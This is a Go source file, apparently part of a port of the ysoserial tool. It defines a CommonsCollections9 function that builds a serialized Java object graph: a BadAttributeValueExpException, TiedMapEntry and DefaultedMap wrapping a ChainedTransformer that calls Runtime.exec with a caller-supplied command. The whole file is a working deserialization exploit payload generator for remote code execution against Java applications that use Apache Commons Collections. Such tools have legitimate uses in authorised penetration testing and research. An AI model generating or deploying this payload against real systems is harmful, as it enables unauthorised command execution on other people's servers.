package ysoserial

func CommonsCollections9(cmd string) []byte {
	return ClassObject{
		name:             "javax.management.BadAttributeValueExpException",
		serialVersionUID: -3105272988410493376,
		classDescFlags:   SC_SERIALIZABLE,
		fields: []Field{
			{"Ljava/lang/Object;", "val", ClassObject{
				name:             "org.apache.commons.collections.keyvalue.TiedMapEntry",
				serialVersionUID: -8453869361373831205,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{Object, "key", "nu1r"},
					{"Ljava/util/Map;", "key", ClassObject{
						name:             "org.apache.commons.collections.map.DefaultedMap",
						serialVersionUID: 19698628745827,
						classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
						fields: []Field{
							{Object, "value", ClassObject{
								name:             "org.apache.commons.collections.functors.ChainedTransformer",
								serialVersionUID: 3514945074733160196,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"[Lorg/apache/commons/collections/Transformer;", "iTransformers", ArrayObject{
										name:             "[Lorg.apache.commons.collections.Transformer;",
										serialVersionUID: -4803604734341277543,
										classDescFlags:   SC_SERIALIZABLE,
										values: interfaces(
											ClassObject{
												name:             "org.apache.commons.collections.functors.ConstantTransformer",
												serialVersionUID: 6374440726369055124,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{Object, "iConstant", ClassDesc{
														name:             "java.lang.Runtime",
														serialVersionUID: 0,
														classDescFlags:   0x00,
													},
													},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.InvokerTransformer",
												serialVersionUID: -8653385846894047688,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"[Ljava/lang/Object;", "iArgs", ArrayObject{
														name:             "[Ljava.lang.Object;",
														serialVersionUID: -8012369246846506644,
														classDescFlags:   SC_SERIALIZABLE,
														values: interfaces(
															"getRuntime", ArrayObject{
																name:             "[Ljava.lang.Class;",
																serialVersionUID: -6118465897992725863,
																classDescFlags:   SC_SERIALIZABLE,
																annotations:      interfaces(),
																values: interfaces(
																	"getRuntime", ArrayObject{
																		name:             "[Ljava.lang.Class;",
																		serialVersionUID: -6118465897992725863,
																		classDescFlags:   SC_SERIALIZABLE,
																		values:           interfaces(),
																		annotations:      interfaces(),
																	},
																),
															},
														),
														annotations: interfaces(),
													}},
													{Object, "iMethodName", "getMethod"},
													{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
														values: interfaces(
															ClassDesc{
																name:             "java.lang.String",
																serialVersionUID: -6849794470754667710,
																classDescFlags:   SC_SERIALIZABLE,
															}, ClassDesc{},
														),
													}},
												},
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.InvokerTransformer",
												serialVersionUID: -8653385846894047688,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"[Ljava/lang/Object;", "iArgs", ArrayObject{
														values: interfaces(
															ArrayObject{
																values: interfaces(),
															},
														),
													}},
													{Object, "iMethodName", "invoke"},
													{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
														values: interfaces(
															ClassDesc{
																name:             "java.lang.Object",
																serialVersionUID: 0,
																classDescFlags:   0x00,
															}, ClassDesc{},
														),
													}},
												},
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.InvokerTransformer",
												serialVersionUID: -8653385846894047688,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"[Ljava/lang/Object;", "iArgs", ArrayObject{
														name:             "[Ljava.lang.String;",
														serialVersionUID: -5921575005990323385,
														classDescFlags:   SC_SERIALIZABLE,
														annotations:      interfaces(),
														values:           interfaces(cmd),
													}},
													{Object, "iMethodName", "exec"},
													{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
														values:      interfaces(),
														annotations: interfaces(),
													}},
												},
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.ConstantTransformer",
												serialVersionUID: 6374440726369055124,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"Ljava/lang/Object;", "iConstant", ClassObject{
														name:             "java.lang.Integer",
														serialVersionUID: 1360826667806852920,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{Integer, "value", 1},
														},
														objectAnnotations: interfaces(),
														super: &ClassObject{
															name:              "java.lang.Number",
															serialVersionUID:  -8742448824652078965,
															classDescFlags:    SC_SERIALIZABLE,
															fields:            []Field{},
															objectAnnotations: interfaces(),
															super:             nil,
														},
													},
													},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											}),
									}},
								},
								classAnnotations: interfaces(),
								super:            nil,
							}},
						},
						classAnnotations: interfaces(
							ClassObject{
								name:             "java.util.HashMap",
								serialVersionUID: 362498820763181265,
								classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
								fields: []Field{
									{Float, "loadFactor", 0.75},
									{Integer, "threshold", 0},
								},
								objectAnnotations: interfaces(
									blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00},
								),
								super: nil,
							},
						),
						super: nil,
					}},
				},
				classAnnotations: interfaces(),
				super:            nil,
			}},
		},
		objectAnnotations: interfaces(),
		super:             nil,
	}.SerializeWithMagicHeader()
}
